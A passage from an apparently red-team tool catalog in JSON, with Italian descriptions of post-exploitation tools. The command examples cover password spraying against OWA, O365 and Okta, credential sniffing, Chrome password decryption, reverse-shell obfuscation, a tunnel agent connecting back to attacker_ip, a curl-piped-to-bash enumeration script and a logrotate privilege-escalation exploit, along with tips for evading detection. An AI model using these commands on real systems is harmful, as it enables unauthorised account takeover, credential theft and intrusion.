    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "mailsniper",
    "name": "MailSniper",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dafthack/MailSniper",
    "desc": "Toolkit PowerShell per cercare dati sensibili nelle caselle di posta Exchange/O365, eseguire password spraying e testare injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MailSniper è uno strumento offensivo dedicato agli ambienti Microsoft Exchange e Office 365. È progettato per due scopi principali: la ricerca di dati sensibili (termini come \"password\", \"credenziali\", \"fattura\") all'interno delle email di un'organizzazione e l'esecuzione di attacchi di password spraying contro OWA (Outlook Web Access) e EWS (Exchange Web Services). È potente per trasformare un singolo account email compromesso in una compromissione di dati massiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Global Address List (GAL) Dumping:</strong> Scarica l'elenco completo degli indirizzi email dell'azienda per creare liste target precise per attacchi successivi.</p><p><strong>Keyword Search (Self & Delegate):</strong> Cerca termini specifici nella casella di posta dell'utente corrente e in tutte le caselle su cui l'utente ha permessi di delega. Utile per trovare VPN config, password inviate via mail o dati finanziari.</p><p><strong>Password Spraying OWA/EWS:</strong> Esegue attacchi di brute-force distribuito (spraying) contro i portali web di posta, supportando la rotazione degli host e il controllo dei tempi per evitare il blocco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Importare il modulo PowerShell.</p><pre><code># Ricerca termini sensibili nella mailbox corrente\nInvoke-SelfSearch -MailboxUser user@domain.com\n\n# Password Spraying contro OWA\nInvoke-PasswordSprayOWA -Url https://mail.corp.com/owa -UserList users.txt -Password \"Estate2024!\"\n\n# Ricerca su tutte le mailbox (Richiede Admin Exchange)\nInvoke-GlobalMailSearch -ImpersonationUser Admin -ExchHostname mail.corp.com -Terms \"password\",\"secret\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In uno scenario di <strong>Internal Threat</strong> o <strong>Compromised User</strong>, MailSniper automatizza la ricerca di informazioni sfruttabili tra migliaia di email storiche. Il password spraying su OWA è spesso l'unico vettore disponibile dall'esterno se la VPN richiede certificati o MFA (anche se OWA dovrebbe avere MFA).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo spraying su OWA genera molti log di accesso fallito (IIS logs, Event logs). La ricerca massiva via EWS genera traffico anomalo e carico sul server Exchange.</p><p><strong>Mitigazioni:</strong> Usare l'opzione <code>-Sleep</code> per rallentare le richieste. Per la ricerca, limitarsi a mailbox chiave o termini specifici per ridurre il tempo di connessione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "net-creds",
    "name": "net-creds",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/DanMcInerney/net-creds",
    "desc": "Script Python per sniffing passivo di credenziali e hash (HTTP, FTP, NTLM, Kerberos, ecc.) da interfaccia di rete o pcap.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Net-Creds è uno sniffer leggero focalizzato esclusivamente sull'estrazione di dati sensibili dal traffico di rete. Analizza i pacchetti in transito per identificare stringhe di autenticazione in chiaro (Basic Auth, FTP, POP3) o challenge crittografici (NTLM, Kerberos, SNMP). È progettato per essere eseguito silenziosamente su una macchina compromessa o durante un Man-in-the-Middle.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Parsing:</strong> Riconosce automaticamente i protocolli e formatta l'output mostrando IP sorgente, destinazione, username e password/hash.</p><p><strong>Pcap Support:</strong> Può analizzare file di cattura registrati precedentemente, utile per analisi forense offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede privilegi root per l'accesso raw socket.</p><pre><code># Sniffing live su interfaccia\nsudo python2 net-creds.py -i eth0\n\n# Lettura da file pcap\npython2 net-creds.py -p capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation:</strong> Lasciato in esecuzione su un server file o un gateway compromesso, raccoglie le credenziali di chiunque vi acceda. Utile per verificare se applicazioni interne usano ancora HTTP o FTP non cifrato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Modalità promiscua della NIC può essere rilevata localmente. Nessun traffico generato in rete (passivo).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "pcredz",
    "name": "PCredz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/lgandx/PCredz",
    "desc": "Sniffer passivo che estrae credenziali (NTLM, HTTP Basic, FTP, POP3, SMTP, SNMP) e hash dal traffico di rete o file pcap.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PCredz è uno strumento di Network Forensics e Credential Harvesting passivo. Analizza il traffico di rete in tempo reale (o file .pcap registrati) per identificare pattern di autenticazione e estrarre credenziali in chiaro o hash. A differenza di Responder (che è attivo/poisoner), PCredz si limita ad ascoltare silenziosamente, rendendolo molto difficile da rilevare.</p><br><hr><h4 class=\"rt-purple\">Protocolli supportati</h4><p><strong>Cleartext:</strong> Cattura credenziali HTTP Basic, FTP, POP3, IMAP, SMTP, Telnet e SNMP community strings (v1/v2).</p><p><strong>Hash/Challenge:</strong> Estrae hash NTLMv1/v2 (da HTTP/SMB/LDAP) e Kerberos hashes, formattandoli automaticamente per essere passati a Hashcat o John the Ripper.</p><p><strong>Credit Cards:</strong> Include regex per identificare numeri di carte di credito che transitano in chiaro (raro ma possibile in reti legacy).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede permessi di root per mettere l'interfaccia in modalità promiscua.</p><pre><code># Ascolto live sull'interfaccia eth0\n./Pcredz -i eth0\n\n# Analisi di un file pcap catturato precedentemente\n./Pcredz -f capture.pcap</code></pre><p>Le credenziali catturate vengono salvate nel file <code>CredentialDump-Session.log</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In uno scenario di <strong>Internal Network Assessment</strong>, lasciare PCredz in esecuzione su un dispositivo compromesso (o Raspberry Pi \"dropbox\") per qualche ora può raccogliere credenziali di amministratori che si collegano a servizi legacy. Ottimo per validare se il traffico sensibile è cifrato (SSL/TLS) o meno.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Passivo e invisibile sulla rete. Tuttavia, mettere la scheda di rete in modalità promiscua può essere rilevato localmente dall'OS o da tool di monitoraggio hardware.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "credking",
    "name": "CredKing",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ustayready/CredKing",
    "desc": "Framework di password spraying che utilizza AWS Lambda (FireProx) per rotazione IP e evasione intelligente del blocco account.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CredKing porta il password spraying a un livello superiore integrando tecniche di evasione IP avanzate. Utilizza AWS API Gateway e Lambda (tramite FireProx) per ruotare l'indirizzo IP sorgente ad ogni richiesta, rendendo inutile il blocco IP da parte dei difensori. Supporta plugin per target multipli come Office 365, Okta, Gmail e SMB, gestendo automaticamente le finestre di lockout.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP Rotation (FireProx):</strong> La caratteristica distintiva. Invece di attaccare dal tuo IP (che verrebbe bannato), CredKing lancia le richieste attraverso infrastruttura cloud effimera, apparendo come traffico legittimo AWS diverso ad ogni tentativo.</p><p><strong>Plugin Modulari:</strong> Architettura estensibile per aggiungere nuovi target di login (es. portali VPN proprietari, app web custom).</p><p><strong>Smart Spraying:</strong> Algoritmi per distribuire i tentativi nel tempo e tra gli utenti, minimizzando la probabilità di triggerare soglie di allarme comportamentale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede configurazione AWS e credenziali. Esecuzione via Python.</p><pre><code># Spraying su O365 con rotazione IP\npython3 credking.py --plugin o365 --userfile users.txt --password \"Password123!\" --threads 5\n\n# Spraying su Okta\npython3 credking.py --plugin okta --target https://corp.okta.com --userfile users.txt --password \"Welcome1\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Indispensabile per <strong>Red Teaming</strong> contro target maturi che implementano Geo-blocking o IP-based rate limiting. Quando un attacco Hydra standard fallisce dopo 3 tentativi per ban IP, CredKing continua imperterrito. Efficace per testare la robustezza delle policy di password esterne.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene l'IP cambi, il pattern di \"molti login falliti su molti account\" è comunque visibile nei log applicativi del target. L'User-Agent potrebbe necessitare di tuning.</p><p><strong>Impatto operativo:</strong> Basso rischio tecnico, ma alto rischio di rilevamento procedurale.</p><p><strong>Mitigazioni:</strong> Usare password molto comuni per massimizzare il successo al primo tentativo. Monitorare attentamente le risposte per fermarsi se il target implementa CAPTCHA.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "decrypt-chrome-passwords-main",
    "name": "decrypt-chrome-passwords",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ohyicong/decrypt-chrome-passwords",
    "desc": "Tool specializzato per estrarre e decifrare credenziali salvate nel database SQLite di Google Chrome (Login Data) via DPAPI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo strumento si focalizza specificamente sul browser Google Chrome (e derivati Chromium). Automatizza il processo di localizzazione del file <code>Login Data</code>, estrazione della chiave di crittografia (memorizzata in <code>Local State</code> e protetta da DPAPI utente) e decifratura delle password. È una versione più mirata e leggera rispetto a suite complete come LaZagne.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Estrazione Master Key:</strong> Recupera la chiave master di Chrome decifrandola tramite le API di Windows (CryptUnprotectData), necessaria per le versioni recenti del browser (v80+).</p><p><strong>Parsing SQLite:</strong> Legge il database locale di Chrome, estraendo URL, username e blob cifrati delle password, gestendo le differenze di schema tra versioni.</p><p><strong>Output Pulito:</strong> Fornisce le credenziali in chiaro pronte per essere usate o esfiltrate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script (Python o EXE) sulla macchina target con l'utente vittima loggato.</p><pre><code># Esecuzione standard\npython3 decrypt_chrome.py\n\n# Output su CSV\npython3 decrypt_chrome.py --output credentials.csv</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilissimo in script di <strong>Automated Post-Exploitation</strong> (es. via USB Rubber Ducky o payload in memoria) per rubare rapidamente accessi web senza dipendenze pesanti. Le credenziali web spesso aprono porte a portali cloud, mail o accessi VPN aziendali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Accesso al file <code>Login Data</code> mentre Chrome è aperto potrebbe fallire (file lock) o generare errori. L'uso di API crittografiche di sistema è monitorabile.</p><p><strong>Mitigazioni:</strong> Copiare i file del database in una temp folder prima di leggerli per evitare lock e ridurre tracce di accesso diretto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "htb-wordlist",
    "name": "HTB-wordlist",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Wordlist curata specificamente per le challenge HackTheBox: directory, file e credenziali ricorrenti nei lab CTF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HTB-wordlist non è un singolo file ma una selezione di dizionari che la community di HackTheBox ha identificato come \"must-have\" per risolvere le macchine della piattaforma. Contiene percorsi web, nomi di file e password che appaiono frequentemente nei laboratori CTF, ottimizzando i tempi di bruteforce rispetto a liste enormi come `directory-list-2.3-medium`.</p><br><hr><h4 class=\"rt-purple\">Caratteristiche</h4><p><strong>Contesto CTF:</strong> Le liste sono pulite da entry inutili per ambienti simulati e arricchite con termini \"troll\" o specifici che i creatori di challenge amano usare.</p><p><strong>Efficienza:</strong> Progettate per dare risultati veloci (Hit rate alto) su macchine vulnerabili intenzionalmente, riducendo il tempo di scansione con Gobuster o Feroxbuster.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Da usare come primo step nelle challenge HTB.</p><pre><code># Directory busting su macchina HTB\ngobuster dir -u http://10.10.10.x -w htb-directories.txt\n\n# Fuzzing vhost\nffuf -u http://10.10.10.x -H \"Host: FUZZ.box.htb\" -w htb-subdomains.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Esclusivamente per <strong>CTF e Training</strong>. In un pentest reale, queste liste potrebbero essere troppo limitate o specifiche (\"CTF-isms\") e mancare di copertura per software enterprise reali.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Non affidarsi solo a queste per assessment reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "omnispray",
    "name": "Omnispray",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/0xZDH/Omnispray",
    "desc": "Tool modulare per password spraying con gestione avanzata di target multipli, delay randomizzato e output strutturato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Omnispray è un framework progettato per semplificare e rendere più sicuro il password spraying su larga scala. A differenza di script one-off, offre una gestione centralizzata dei target e delle credenziali testate, con funzionalità robuste per evitare lockout e rilevamento.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Safety Controls:</strong> Implementa jitter (ritardi casuali) tra le richieste e stop automatici in caso di troppi errori consecutivi, per mimetizzarsi nel traffico normale.</p><p><strong>Target multipli:</strong> Può attaccare simultaneamente diversi servizi (O365, OWA, VPN, SSH) usando moduli specifici, riutilizzando la stessa lista utenti.</p><p><strong>Reporting:</strong> Genera log puliti e file CSV con le credenziali valide, pronti per la fase successiva.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Configurare il target e lanciare lo spray.</p><pre><code># Spraying base su OWA\npython3 omnispray.py --module owa --target https://mail.corp.com --users users.txt --password \"Fall2024!\"\n\n# Spraying con delay elevato (stealth)\npython3 omnispray.py --module ssh --target 192.168.1.0/24 --users users.txt --password \"Password123\" --delay 30-60</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>External Recon:</strong> Testare le difese perimetrali (VPN, Webmail) con una singola password comune senza rischiare di bloccare l'intera azienda.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Anche con delay, il volume di login falliti da un singolo IP è sospetto. Usare in combinazione con proxy rotation (es. FireProx) se supportato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "statistically-likely-usernames",
    "name": "statistically-likely-usernames",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/insidetrust/statistically-likely-usernames",
    "desc": "Generatore di wordlist username basato su dati di censimento e pattern aziendali (nome.cognome, iniziali) per password spraying efficace.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Non è un software, ma una risorsa/metodologia per generare liste di username ad alta probabilità. Sfrutta dataset pubblici (nomi e cognomi più diffusi per nazionalità) e li combina con formati username standard (es. <code>m.rossi</code>, <code>mario.rossi</code>, <code>rossim</code>). Questo approccio statistico aumenta drasticamente il successo del password spraying e dell'enumerazione utenti riducendo il numero di richieste inutili verso account inesistenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dataset Reali:</strong> Include liste di nomi maschili/femminili e cognomi basati su dati di censimento USA, UK, e altri paesi, ordinati per frequenza.</p><p><strong>Pattern Generation:</strong> Script o logiche per permutare nomi e cognomi nei formati più usati dalle aziende (jsmith, john.s, smithj, ecc.).</p><p><strong>Efficienza:</strong> Permette di colpire il \"top 5%\" degli utenti probabili (es. i 100 cognomi più comuni coprono una grossa fetta della popolazione), ottimizzando il tempo di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si usa offline per preparare la lista target prima dell'attacco.</p><pre><code># Generazione lista username (esempio concettuale con tool di supporto)\n./generate-usernames.sh --format first.last --top 1000 > targets.txt\n\n# Uso con Kerbrute\nkerbrute userenum -d domain.local targets.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale in fasi di <strong>Recon Black-Box</strong> esterna quando non si hanno liste dipendenti. Combinato con LinkedIn scraping (per trovare i nomi reali), questo tool aiuta a indovinare il formato username aziendale (es. testando 10 dipendenti noti) e poi generare una lista massiva per l'intera azienda.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'accuratezza dipende dalla nazionalità del target. Usare liste anglosassoni su un'azienda italiana produrrà risultati scarsi. Necessita di localizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "username-anarchy-0-6",
    "name": "username-anarchy",
    "version": "0.6",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/urbanadventurer/username-anarchy",
    "desc": "Tool per generare liste di username basate su nomi reali, permutando formati comuni (j.doe, doe.j) per attacchi mirati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Username Anarchy risolve il problema di indovinare il formato degli username aziendali. Partendo da una lista di nomi e cognomi reali (es. ottenuta da LinkedIn), genera tutte le possibili permutazioni standard utilizzate dalle aziende (flast, first.last, f.last, ecc.). È essenziale per preparare liste di alta qualità per password spraying o phishing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Smart Permutation:</strong> Supporta decine di formati (Facebook style, Corporate standard) e sostituzioni (es. 'ø' -> 'o').</p><p><strong>Format Recognition:</strong> Se fornito di alcuni username noti, può tentare di dedurre il formato usato dall'azienda e generare gli altri di conseguenza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>CLI Ruby.</p><pre><code># Generazione massiva da lista nomi\n./username-anarchy -i fullnames.txt > userlist.txt\n\n# Generazione formato specifico (es. j.doe)\n./username-anarchy -f first.last Mario Rossi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Recon & Spraying:</strong> Per trasformare i dati OSINT (nomi dipendenti) in dati operativi (username validi) prima di lanciare un attacco Kerbrute o O365 spray.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Tool offline, nessun impatto OPSEC diretto. L'accuratezza della lista generata riduce il rumore degli attacchi successivi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "bashfuscator",
    "name": "Bashfuscator",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Bashfuscator/Bashfuscator",
    "desc": "Framework avanzato per offuscare script Bash rendendoli illeggibili e bypassando rilevamenti statici/signature-based.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bashfuscator è uno strumento potente per rendere incomprensibili gli script Bash e i payload Linux. Utilizza varie tecniche di manipolazione delle stringhe, encoding e logiche contorte per generare script funzionalmente identici all'originale ma completamente diversi nella forma, bypassando analisi statiche e filtri IDS che cercano keyword specifiche (es. <code>wget</code>, <code>nc -e</code>).</p><br><hr><h4 class=\"rt-purple\">Tecniche di offuscamento</h4><p><strong>Layering:</strong> Applica molteplici strati di offuscamento (es. Base64 -> AES -> XOR -> Reverse) che vengono decifrati a runtime dallo script stesso.</p><p><strong>Token Manipulation:</strong> Spezza i comandi in pezzi e usa variabili randomiche per ricostruirli (es. <code>c=\"l\"; a=\"s\"; $a$c -la</code>).</p><p><strong>Polimorfismo:</strong> Genera un output diverso ogni volta che viene eseguito, rendendo inutile la creazione di firme hash statiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Passare lo script o il comando da offuscare.</p><pre><code># Offuscamento di un one-liner\n./bashfuscator -c \"cat /etc/passwd\" -o payload.sh\n\n# Offuscamento di uno script file con 2 layer random\n./bashfuscator -f reverse_shell.sh -l 2 --choose-mutators random</code></pre><p>L'output è uno script bash pronto da eseguire sul target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Red Teaming</strong>, è vitale per bypassare controlli di sicurezza che ispezionano script caricati o comandi eseguiti (es. auditd logs, EDR Linux). Utile per nascondere la logica di un payload di persistenza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli script offuscati hanno spesso un'entropia molto alta o usano costrutti <code>eval</code> sospetti che i moderni EDR possono flaggare euristicamente come \"obfuscated script\". Testare sempre in lab.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng",
    "name": "Ligolo-ng",
    "version": "0.8.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nicocha30/ligolo-ng",
    "desc": "Tool di tunneling/pivoting moderno che usa interfacce TUN per routing completo (TCP/UDP/ICMP) senza bisogno di SOCKS proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ligolo-ng rappresenta l'evoluzione del pivoting. A differenza dei tradizionali proxy SOCKS (come Chisel o SSH -D) che gestiscono solo connessioni TCP e richiedono \"proxychains\", Ligolo-ng crea un'interfaccia di rete virtuale (TUN) sulla macchina dell'attaccante. Questo permette di instradare <strong>tutto</strong> il traffico di rete (inclusi SYN scan, UDP, ICMP ping) verso la rete interna compromessa in modo trasparente, come se si fosse collegati in VPN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full VPN-like Experience:</strong> Permette di usare tool come Nmap (con OS detection), Masscan o Kerberos tools senza wrapper o configurazioni proxy complesse.</p><p><strong>User-Space Execution:</strong> L'agent sul target gira in user-space (non richiede driver o privilegi amministrativi per funzionare, anche se privilegiati servono per alcune feature di rete avanzate).</p><p><strong>Reverse Tunneling:</strong> L'agent si connette al proxy dell'attaccante, bypassando firewall che bloccano connessioni in ingresso (bind shells).</p><p><strong>Certificati Let's Encrypt:</strong> Supporta gestione automatica certificati SSL per cifrare il traffico del tunnel e mascherarlo come HTTPS legittimo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Setup: Proxy sulla macchina attaccante, Agent sulla vittima.</p><pre><code># Attaccante (Setup interfaccia e listener)\nsudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert\n\n# Vittima (Connect back)\n./agent -connect attacker_ip:11601 -ignore-cert\n\n# Attaccante (Nella console ligolo)\nsession 1\nstart\n# Aggiunta rotta sul sistema attaccante\nsudo ip route add 192.168.50.0/24 dev ligolo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per <strong>Deep Network Pivoting</strong>. Se comprometti un server web esposto e vuoi scansionare la rete interna database con Nmap <code>-sS</code> (SYN scan) o eseguire attacchi UDP (es. Kerberoasting, SNMP), Ligolo-ng è superiore a qualsiasi proxy SOCKS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico è cifrato (TLS), ma una connessione persistente a lungo termine verso un IP esterno è sospetta (Beaconing). L'agent in memoria è un eseguibile Go che può essere firmato da EDR.</p><p><strong>Mitigazioni:</strong> Usare redirector https legittimi davanti al proxy. Rinominare l'agent.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "linenum",
    "name": "LinEnum",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/rebootuser/LinEnum",
    "desc": "Script Bash per privilege escalation enumeration su Linux: verifica kernel, SUID/GUID, cron jobs, config files e permessi errati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LinEnum è uno dei primi e più diffusi script di enumerazione automatica per sistemi Linux. Esegue una batteria di oltre 60 controlli per identificare vettori comuni di escalation dei privilegi locali. È progettato per essere eseguito \"senza installazione\" (basta lo script bash) e fornisce un report dettagliato evidenziando (in giallo/rosso/magenta) le configurazioni più promettenti per ottenere root.</p><br><hr><h4 class=\"rt-purple\">Controlli principali</h4><p><strong>Kernel & Distribution:</strong> Identifica versione OS e Kernel per cercare exploit locali noti (es. DirtyCow).</p><p><strong>Permessi & Capabilities:</strong> Cerca file con bit SUID/SGID attivi, file scrivibili da \"world\" o gruppo, e capabilities POSIX anomale assegnate a eseguibili.</p><p><strong>Servizi & Job:</strong> Enumera processi girano come root, cron job (task pianificati) leggibili o modificabili, e timer di systemd.</p><p><strong>Credenziali:</strong> Cerca password in chiaro in file di config, history della shell, chiavi SSH e file <code>.plan</code>.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Copiare lo script sul target ed eseguirlo. Non richiede privilegi root.</p><pre><code># Esecuzione base con output a video\n./LinEnum.sh\n\n# Esecuzione approfondita (keyword search, test extra) e output file\n./LinEnum.sh -k password -e /tmp/ -t -r report.txt\n\n# Esecuzione memory-only (via curl)\ncurl -L https://raw.githubusercontent.com/.../LinEnum.sh | bash</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il primo step dopo aver ottenuto una shell <strong>Low Privilege</strong> su Linux. Risolve il problema del \"non so cosa cercare\", fornendo in pochi secondi una lista di potenziali vulnerabilità (es. un binario SUID di <code>nmap</code> vecchio, o un cron job che esegue uno script scrivibile dal tuo utente).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> LinEnum tocca migliaia di file in pochi secondi (scan filesystem). Questo genera un picco di I/O e accessi (atime updates) estremamente rumoroso. I comandi eseguiti finiscono nell'audit log.</p><p><strong>Mitigazioni:</strong> In ambienti monitorati, eseguire controlli manuali mirati invece dello script completo. Usare la redirezione output su <code>/dev/shm</code> (RAM disk) per evitare scritture su disco fisico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "logrotten-2-1",
    "name": "logrotten",
    "version": "2.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/whotwagner/logrotten",
    "desc": "Exploit PoC per race condition in logrotate che permette Privilege Escalation da utente log a root.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>logrotten è un exploit che sfrutta una vulnerabilità di Race Condition nel tool di sistema <code>logrotate</code>. Se logrotate è configurato per gestire log in directory controllate dall'utente (o scrivibili), l'exploit permette di sostituire il file di log con un symlink o un payload maligno nell'istante esatto in cui logrotate esegue le operazioni, ottenendo esecuzione di codice come root.</p><br><hr><h4 class=\"rt-purple\">Meccanismo</h4><p><strong>Race Condition:</strong> Monitora il file di log target. Quando logrotate inizia a rinominare/comprimere il file, logrotten scambia il file con un symlink a una directory sensibile (es. <code>/etc/bash_completion.d/</code>).</p><p><strong>Payload Injection:</strong> Se la race condition vince, logrotate scrive o sposta il payload dell'attaccante nella directory di sistema, che verrà poi eseguito da root o da altri utenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede compilazione del binario C sul target.</p><pre><code># Compilazione\ngcc logrotten.c -o logrotten\n\n# Esecuzione (richiede un file di log vulnerabile)\n./logrotten -p ./payload.sh /tmp/vulnerable.log</code></pre><p>Spesso richiede di forzare la rotazione dei log o attendere il cron job giornaliero.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Specifico per <strong>Linux Privilege Escalation</strong>. Utile quando si ha accesso come utente di servizio (es. <code>www-data</code> o <code>mysql</code>) che ha permessi di scrittura sui propri log, e logrotate gira come root.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'esecuzione dell'exploit può fallire più volte, lasciando tracce di file corrotti o symlink anomali. È un attacco attivo e rischioso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "one-gadget-1-10-0",
    "name": "OneGadget",
    "version": "1.10.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/david942j/one_gadget",
    "desc": "Tool per binary exploitation che trova indirizzi ROP nella libc per eseguire execve('/bin/sh') con un singolo salto.",
